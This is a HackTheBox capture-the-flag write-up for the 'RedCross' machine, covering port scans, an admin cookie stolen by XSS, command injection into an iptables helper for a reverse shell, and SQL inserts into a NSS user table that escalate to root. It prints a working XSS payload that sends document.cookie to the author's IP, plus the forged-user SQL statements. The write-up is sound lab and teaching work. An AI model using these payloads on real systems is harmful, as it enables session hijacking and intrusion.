---
title: HTB [RedCross]
date: 2023-02-21 01:28:05 +0200
categories: [linux,xss,psql]
tags: [HACKTHEBOX MACHINES]
excerpt: RedCross is a medium hackthebox machine that involves a huge path to get user, so let's jump straight into the writeup
---


![](https://i.imgur.com/sVTQqvW.png)

## RECON

### Port Scan

```js
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 67d385f8eeb8062359d7758ea237d0a6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvHxBEHZStDr7Frfk25i6xP+UPJUeVxLxxjZ9M52P3RH3o9II26fOQkuVq0V9y+jAMzpOEPVOHm0KrD9T3R8rPUebJM8qPQfMjs4d7vefyHhCv0wJ1UlRcMv7wi3+8hJ3ATWXkeTnRHtloNrvN9IkII1zRApDM5qAKVZf7kLH8vppgAkK6XX0RfvEbiiIF4/4t9Swk0pqKazlBoxNmuBQ0ZBC09vlkbx4hJGR/7xQ18PJP/RoUNQgLFMeaGVq1c+/44w8G6G125w671x0NO9dvysiF1XAtRWvYuc6B0Y9RXdZ+Fl4UyPcBfnfjDS0uT6MF5LP4HYZwAq8UVkN6zaXD
|   256 89b465271f93721abce3227090db3596 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD0fZY6OjH5EARn0aeiHLZb2aOe8knzx1q3pZSdXd9jHvpmRfuLhu7Pw+BLaQW0WJJ5ZNfIdSgx8epBblM6PBgk=
|   256 66bda11c327432e2e664e8a5251b4d67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMWzieju6+BudzSxF+Zl5/b1kQZ+vJVlxmSfVeirE0K
80/tcp  open  http     syn-ack Apache httpd 2.4.25
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
443/tcp open  ssl/http syn-ack Apache httpd 2.4.25
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US/organizationalUnitName=IT/localityName=New York/emailAddress=penelope@redcross.htb
| Issuer: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US/organizationalUnitName=IT/localityName=New York/emailAddress=penelope@redcross.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-03T19:46:58
| Not valid after:  2021-02-27T19:46:58
| MD5:   f95b6897247dca2f3da76756104616f1
| SHA-1: e86ee8276dddb4837f86c59b2995002c77ccfcea
| -----BEGIN CERTIFICATE-----
| MIIEFjCCAv6gAwIBAgIJAOvkz8L8YpWbMA0GCSqGSIb3DQEBCwUAMIGfMQswCQYD
| VQQGEwJVUzELMAkGA1UECAwCTlkxETAPBgNVBAcMCE5ldyBZb3JrMSAwHgYDVQQK
| DBdSZWQgQ3Jvc3MgSW50ZXJuYXRpb25hbDELMAkGA1UECwwCSVQxGzAZBgNVBAMM
| EmludHJhLnJlZGNyb3NzLmh0YjEkMCIGCSqGSIb3DQEJARYVcGVuZWxvcGVAcmVk
| Y3Jvc3MuaHRiMB4XDTE4MDYwMzE5NDY1OFoXDTIxMDIyNzE5NDY1OFowgZ8xCzAJ
| BgNVBAYTAlVTMQswCQYDVQQIDAJOWTERMA8GA1UEBwwITmV3IFlvcmsxIDAeBgNV
| BAoMF1JlZCBDcm9zcyBJbnRlcm5hdGlvbmFsMQswCQYDVQQLDAJJVDEbMBkGA1UE
| AwwSaW50cmEucmVkY3Jvc3MuaHRiMSQwIgYJKoZIhvcNAQkBFhVwZW5lbG9wZUBy
| ZWRjcm9zcy5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQD2OP+5
| cB676azABMDt9hhAs1ZxiRbtEK5zH3LFfdqAcjmQ/3qKIF5Z4IKGorFnacCaNyzm
| PKD1RvNX89vDseUNSLIri+yHXhBV6xYvFhLAVyBtr0qftnGVj2H+i2cXoJ2HnG0S
| Ir5GvShE9Vuz++/3bZm++UugOp3P4jqsQhbOnGsuVEk02SG1t/sj8TpbiHdvp6IL
| Pk7R5/wSPceMiAUqTiJlnh6Ta/M1jlc/8cSEOuvc6svcqzNc4fgdzc7CZs5BdXkl
| 2/yS5N3L1/BGtT7ybuyqAAG6WIoXm7lzelznyfhbA64msCKDxZjc7vA4Pbf2H7Pg
| BZc+ykRALZlBWl6fAgMBAAGjUzBRMB0GA1UdDgQWBBTTL+T9ZVOmffuspVFB7Kjr
| GiKZJjAfBgNVHSMEGDAWgBTTL+T9ZVOmffuspVFB7KjrGiKZJjAPBgNVHRMBAf8E
| BTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBCXgR48Nj5D0C+aVEh4QMQHQ8h8CUs
| zKwaEfZLBDhAfxPNv33OQ9HY8j/hfW4rmmIRUtXg3yUdUjVHUzU69UTTTZ19klgu
| YkAZ3IbGd1hvDc6efP25BwsIVByVM+/9suItUP0L7dp1PIzhObV6lHiXlU2nWu+1
| fnQY2MRwhmc/O0cEQ3tZ5UHy8Ix8jEH+jJceLY671uWB0CELFKcXWI2p4G7MYRyj
| 9/FNo7Kd84A7/ifogbSwJBobzgtQn9+4clbe+D1KJ7+OmvJHWJK47zHO1CZISXg6
| hKbexhCs7Ab0ipy5wlmzB9PkK7X12ze72Jalhc7hyTDTAY71WB1ZAYw2
|_-----END CERTIFICATE-----
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Add `intra.redcross.htb` to your `/etc/hosts` file

### Web Enumeration

![](https://i.imgur.com/7Z5cUpS.png)

- It has a login page with `Web messaging system 0.3b` 
- You can notice the `?page=login` param
- Tried some LFI there but nothing worked!!
- `Please contact with our staff via contact form to request your access credentials.`
- Let's do that

![](https://i.imgur.com/VuehzCg.png)

- They're sending a post request to `/page/action.php` with our data
- Resonse: `Contact request sent.`

![](https://i.imgur.com/magUtaG.png)

- Staff will review it so let's try some xss here

![](https://i.imgur.com/k2Log1t.png)

- Got a hit in my server, now time to steal his cookies 🍪

<br>

```js
<script>document.write('<img+src%3d"http%3a//10.10.16.10%3fc%3d'%2bdocument.cookie%2b'"+/>')%3b</script>
```

<br>

![](https://i.imgur.com/SuTuk6T.png)

- We got the cookie and the DOMAIN says it's `admin`

### admin.redcross.htb

![](https://i.imgur.com/ShqoPCQ.png)

- We got `admin.redcross.htb` in wfuzz

![](https://i.imgur.com/WQFCkfY.png)

- Same login page but with a different name
- Let's use our stealed cookie

![](https://i.imgur.com/75HWKke.png)

- Now we're admin and having access to the cpanel

## INITIAL FOOTHOLD

![](https://i.imgur.com/988t0DY.png)

- Here we can able to add the users

![](https://i.imgur.com/BnCRtxX.png)

- Let's save this request and use it in SQLmap, coz they must use some type of query to add user right?

![](https://i.imgur.com/dne5XEe.png)

- Also we have delete user option

### Firewall access

- Those parameters are not vulnerable ig
- My machine got messedup after this scan, I can't access the web page
- So I've reseted it!!

![](https://i.imgur.com/L7agu91.png)

- We have another option called `Network Access`, there we can whitelist our IP
- What if firewall blocks certain ports from non internal IP's?
- So let's add our IP here and do a nmap scan again

PS: I've tried Command Injection here, coz they're using iptables to add our ip, but nothing worked :(

![](https://i.imgur.com/yE4MxK2.png)

- Now let's scan this box again

![](https://i.imgur.com/yobSKNS.png)

- Yeh there're a few more ports opened

<br>

```js
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.0.8 or later
22/tcp   open  ssh         syn-ack OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 67d385f8eeb8062359d7758ea237d0a6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvHxBEHZStDr7Frfk25i6xP+UPJUeVxLxxjZ9M52P3RH3o9II26fOQkuVq0V9y+jAMzpOEPVOHm0KrD9T3R8rPUebJM8qPQfMjs4d7vefyHhCv0wJ1UlRcMv7wi3+8hJ3ATWXkeTnRHtloNrvN9IkII1zRApDM5qAKVZf7kLH8vppgAkK6XX0RfvEbiiIF4/4t9Swk0pqKazlBoxNmuBQ0ZBC09vlkbx4hJGR/7xQ18PJP/RoUNQgLFMeaGVq1c+/44w8G6G125w671x0NO9dvysiF1XAtRWvYuc6B0Y9RXdZ+Fl4UyPcBfnfjDS0uT6MF5LP4HYZwAq8UVkN6zaXD
|   256 89b465271f93721abce3227090db3596 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD0fZY6OjH5EARn0aeiHLZb2aOe8knzx1q3pZSdXd9jHvpmRfuLhu7Pw+BLaQW0WJJ5ZNfIdSgx8epBblM6PBgk=
|   256 66bda11c327432e2e664e8a5251b4d67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMWzieju6+BudzSxF+Zl5/b1kQZ+vJVlxmSfVeirE0K
80/tcp   open  http        syn-ack Apache httpd 2.4.25
|_http-title: Did not follow redirect to https://admin.redcross.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
443/tcp  open  ssl/http    syn-ack Apache httpd 2.4.25
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /?page=login
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US/localityName=New York/emailAddress=penelope@redcross.htb/organizationalUnitName=IT
| Issuer: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US/localityName=New York/emailAddress=penelope@redcross.htb/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-03T19:46:58
| Not valid after:  2021-02-27T19:46:58
| MD5:   f95b6897247dca2f3da76756104616f1
| SHA-1: e86ee8276dddb4837f86c59b2995002c77ccfcea
| -----BEGIN CERTIFICATE-----
| MIIEFjCCAv6gAwIBAgIJAOvkz8L8YpWbMA0GCSqGSIb3DQEBCwUAMIGfMQswCQYD
| VQQGEwJVUzELMAkGA1UECAwCTlkxETAPBgNVBAcMCE5ldyBZb3JrMSAwHgYDVQQK
| DBdSZWQgQ3Jvc3MgSW50ZXJuYXRpb25hbDELMAkGA1UECwwCSVQxGzAZBgNVBAMM
| EmludHJhLnJlZGNyb3NzLmh0YjEkMCIGCSqGSIb3DQEJARYVcGVuZWxvcGVAcmVk
| Y3Jvc3MuaHRiMB4XDTE4MDYwMzE5NDY1OFoXDTIxMDIyNzE5NDY1OFowgZ8xCzAJ
| BgNVBAYTAlVTMQswCQYDVQQIDAJOWTERMA8GA1UEBwwITmV3IFlvcmsxIDAeBgNV
| BAoMF1JlZCBDcm9zcyBJbnRlcm5hdGlvbmFsMQswCQYDVQQLDAJJVDEbMBkGA1UE
| AwwSaW50cmEucmVkY3Jvc3MuaHRiMSQwIgYJKoZIhvcNAQkBFhVwZW5lbG9wZUBy
| ZWRjcm9zcy5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQD2OP+5
| cB676azABMDt9hhAs1ZxiRbtEK5zH3LFfdqAcjmQ/3qKIF5Z4IKGorFnacCaNyzm
| PKD1RvNX89vDseUNSLIri+yHXhBV6xYvFhLAVyBtr0qftnGVj2H+i2cXoJ2HnG0S
| Ir5GvShE9Vuz++/3bZm++UugOp3P4jqsQhbOnGsuVEk02SG1t/sj8TpbiHdvp6IL
| Pk7R5/wSPceMiAUqTiJlnh6Ta/M1jlc/8cSEOuvc6svcqzNc4fgdzc7CZs5BdXkl
| 2/yS5N3L1/BGtT7ybuyqAAG6WIoXm7lzelznyfhbA64msCKDxZjc7vA4Pbf2H7Pg
| BZc+ykRALZlBWl6fAgMBAAGjUzBRMB0GA1UdDgQWBBTTL+T9ZVOmffuspVFB7Kjr
| GiKZJjAfBgNVHSMEGDAWgBTTL+T9ZVOmffuspVFB7KjrGiKZJjAPBgNVHRMBAf8E
| BTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBCXgR48Nj5D0C+aVEh4QMQHQ8h8CUs
| zKwaEfZLBDhAfxPNv33OQ9HY8j/hfW4rmmIRUtXg3yUdUjVHUzU69UTTTZ19klgu
| YkAZ3IbGd1hvDc6efP25BwsIVByVM+/9suItUP0L7dp1PIzhObV6lHiXlU2nWu+1
| fnQY2MRwhmc/O0cEQ3tZ5UHy8Ix8jEH+jJceLY671uWB0CELFKcXWI2p4G7MYRyj
| 9/FNo7Kd84A7/ifogbSwJBobzgtQn9+4clbe+D1KJ7+OmvJHWJK47zHO1CZISXg6
| hKbexhCs7Ab0ipy5wlmzB9PkK7X12ze72Jalhc7hyTDTAY71WB1ZAYw2
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
1025/tcp open  NFS-or-IIS? syn-ack
5432/tcp open  postgresql  syn-ack PostgreSQL DB 9.6.7 - 9.6.12
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=redcross.redcross.htb
| Subject Alternative Name: DNS:redcross.redcross.htb
| Issuer: commonName=redcross.redcross.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-03T19:13:20
| Not valid after:  2028-05-31T19:13:20
| MD5:   677429d26eca29e1fdd947e5f3655eeb
| SHA-1: 7e9c03e4def628626dc9b8577f0f43a5ba117f2b
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIJAJ9W3OqD9RjVMA0GCSqGSIb3DQEBCwUAMCAxHjAcBgNV
| BAMMFXJlZGNyb3NzLnJlZGNyb3NzLmh0YjAeFw0xODA2MDMxOTEzMjBaFw0yODA1
| MzExOTEzMjBaMCAxHjAcBgNVBAMMFXJlZGNyb3NzLnJlZGNyb3NzLmh0YjCCASIw
| DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALBwwr65lxvdoQWPK9zn/TTiwn3Y
| WdnTZAdPTsIrdV/M858k9iVSY+F4fho2v6bejqR7A3AGlQD/LqZ2k9YXZS/hfF/6
| fqovxBCNxkLIfXZ/UIgAgeW+4l6gCPt/pR79myG2H79Kdo4GnATOwwJ44IVy1F69
| /F17V01GQv29kuwtMmge6FI+l6Ro2n6j0MtByTVh+yXQSbcMb5LfTU93ttt0F1yE
| rog9IhrfNI+K2njtKI4LslBlWGo+HuxIrGWJwA4bD/q390XYH4XwHlQCiWWHSQfu
| 1xUFDNi0AzzDB/WeQ56dvJY7jHVgEGzckZS1PJ3PrmhKO1Ad0jxLIQsTuWECAwEA
| AaMvMC0wCQYDVR0TBAIwADAgBgNVHREEGTAXghVyZWRjcm9zcy5yZWRjcm9zcy5o
| dGIwDQYJKoZIhvcNAQELBQADggEBADR26Z+axy4HRMPy0vgk51+hG6qJdL3vu9WR
| mP3zeq0R1INIjgU/3YWR/9IWzEUncteRggGQiWiMDthNKX9mPemKon9W4yyxWOzz
| 3jUCDTAiittw5BM0Xxea23I9lcMsgItjgMhKaI7zdIg5QzXjryBkKciSwbVNtNJg
| 5JfILg0AHS9rC1bHTlvOpOKk303Z+2f6ajZo8MTMH+MUGckOGc7An8j3WTdIY+Ot
| RknTcbORCN7Ntgwf9Wd9ijXDEY8Cv0XxYni7Osz4jfhQqiL3SC1kXeFEI8rCaA+B
| NYJybx4k2un7+YVGWN+D32F3N5qY3Sd84jFjQwt90csafWMMp9w=
|_-----END CERTIFICATE-----
Service Info: Hosts: RedCross, redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br>

![](https://i.imgur.com/FxPoN2n.png)

- Anonymous login was disabled in FTP, remember we have a page there we can add users right?

![](https://i.imgur.com/4LX1f8L.png)

- Let's add this user and try logging in via FTP

![](https://i.imgur.com/LQ5OAfr.png)

- We got a password => `TxXHseUr` , let's use this

![](https://i.imgur.com/bHfNZJs.png)

- Login Successful!

![](https://i.imgur.com/uXQVgnS.png)

- We have `iptctl.c` in `public/src` folder

![](https://i.imgur.com/Mnmh0Y8.png)

- It's a c program, It gets executed when we provide our IP to whitelist in `admin.redcross.htb`

### SSH as testftp

![](https://i.imgur.com/HDfgBie.png)

- We can also use our credentials over SSH 

![](https://i.imgur.com/ULH3Nhz.png)

- We're in jail with limited binaries
- So these things basically means we need to read the source code

![](https://i.imgur.com/tDTG2D6.png)

- We have 3 actions, but this differs to the action of webpage
- The name of the action is different `Allow IP` & `deny`
- Ig something happens in backend to translate this, nvm lets check this
- Basically this function returns the `a` value and that corresponds to the action (you can see they're setting `a=<1,2,3>` after the if statement

![](https://i.imgur.com/qfz168F.png)

- And they're storing the value in `isAction` variable
- After that they're checking whether it's an IP address or not

![](https://i.imgur.com/pIvC2la.png)

- This takes a char pointer as an argument
- First they're creating a struct to hold our IP address
- Then they're using `inet_pton` to check it's valid or not

![](https://i.imgur.com/Px1drzf.png)

- After converting it stores it in the `sin_addr` field of `sockaddr_in` struct and returns it's true or not
- So it seems we can't bypass this

![](https://i.imgur.com/9XhuAsq.png)

- But that check is not even a matter here, coz they don't check if both are valid or not
- They're happily passing that to `cmdAR` function with `-A` for allow and `-D` for deny

![](https://i.imgur.com/UCxf331.png)

- 1) `-A` or `-D`
- 2) Contents of our `ip` argument

![](https://i.imgur.com/0bLtoDn.png)

- There are no checks for command injections, but idk why our cmd injection failed then

![](https://i.imgur.com/TRhbV13.png)

- But it worked for me when I used the option `deny` to restrict the IP address
- Lol, let's look into it after rooting this box
- For now we need to get a rev shell

![](https://i.imgur.com/Ps8TDSb.png)

- Got a rev shell
- But we don't have access to read user.txt 

### www-data -> penelope

![](https://i.imgur.com/ceVeLo2.png)

- We got psql creds from `users.php` => `unixnss:fios@ew023xnw`

![](https://i.imgur.com/20VfUkd.png)

- Using that we can login with psql (Note: mention the db name `-W unix`)

![](https://i.imgur.com/barC6DL.png)

- There are 5 databases, `redcross` seems intersting
- Change the database using `\c redcross` command

![](https://i.imgur.com/X5m6VPJ.png)

- But we don't have access to that database and that's not interesting
- I guess there should be some info about IPs that's all, now let's go back to our unix database

![](https://i.imgur.com/iuuSAHR.png)

- It has 6 tables

![](https://i.imgur.com/1z7HcwQ.png)

- Those shit are from sqlmap, it added those usernames with payloads
- We have `username, passwd, uid, gid, gecos, homedir, shell`
- What happens if we change the the `uid` or `homedir`?
- [This page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) from hacktricks helps a lot 
- First let's grab a password, for this I'm gonna use the password of `testftp` account that we created earlier
- `select * from passwd_table where username='testftp';`
- Values: `testftp  | $1$1ufUTJ64$0V2qspdjqo9VV0Bm2wM6c1 | 2041 | 1001 |       | /var/jail/home | /bin/bash`
- Now I'm gonna create a user with `UID = 1000` and `homedir = /home/penelope`
- `insert into passwd_table values ('fakeusr','$1$1ufUTJ64$0V2qspdjqo9VV0Bm2wM6c1','1001','1001','','/home/penelope','/bin/bash');` 

![](https://i.imgur.com/jHK9Omh.png)

- WTF XD

![](https://i.imgur.com/fww7SD1.png)

- After that I've noticed, that I missed a crucial part in enumeration, I haven't grepped for passwords properlly
- Now let's login with `unixusrmgr:dheu%7wjx8B&`
- `ERROR:  permission denied for relation passwd_table` again!!
- Turns out we can't controll the `uid` & `shell` values
- So let's set the `GID=1000`
- `insert into passwd_table (username, passwd, gid, homedir) values ('fakeusr', '$1$1ufUTJ64$0V2qspdjqo9VV0Bm2wM6c1', 1000, '/home/penelope/');`
- It worked!!
- `select * from passwd_table where username='fakeusr';`

<br>

```js
 username |               passwd               | uid  | gid  | gecos |     homedir     |   shell
----------+------------------------------------+------+------+-------+-----------------+-----------
 fakeusr  | $1$1ufUTJ64$0V2qspdjqo9VV0Bm2wM6c1 | 2043 | 1000 |       | /home/penelope/ | /bin/bash
```

<br>

- Now let's ssh as fakeusr with the password `TxXHseUr`

![](https://i.imgur.com/9fq4oBx.png)

- Cool we got the user.txt

## PRIVESC

- We can control the `gid` value so if we add a user with `gid=0` then we have access to the root group
- `insert into passwd_table (username, passwd, gid, homedir) values ('fakerootusr', '$1$1ufUTJ64$0V2qspdjqo9VV0Bm2wM6c1',0, '/home/penelope/');`

![](https://i.imgur.com/YzuTTrn.png)

- We have the `gid=0` but we can't able to read `root.txt`, and we can read that when we add a user to sudoers group
- You can see the above message also tells that
- `insert into passwd_table (username, passwd, gid, homedir) values ('fakesudoer', '$1$1ufUTJ64$0V2qspdjqo9VV0Bm2wM6c1',27, '/home/penelope/');`
- So let's change the `gid=27`

![](https://i.imgur.com/3CFGfuv.png)

- Now we can able to read root.txt!!
- This was a very interesting box, there are multiple ways to do every step
- Thanks [ompamo](https://www.hackthebox.com/home/users/profile/9631) for creating this ❤️

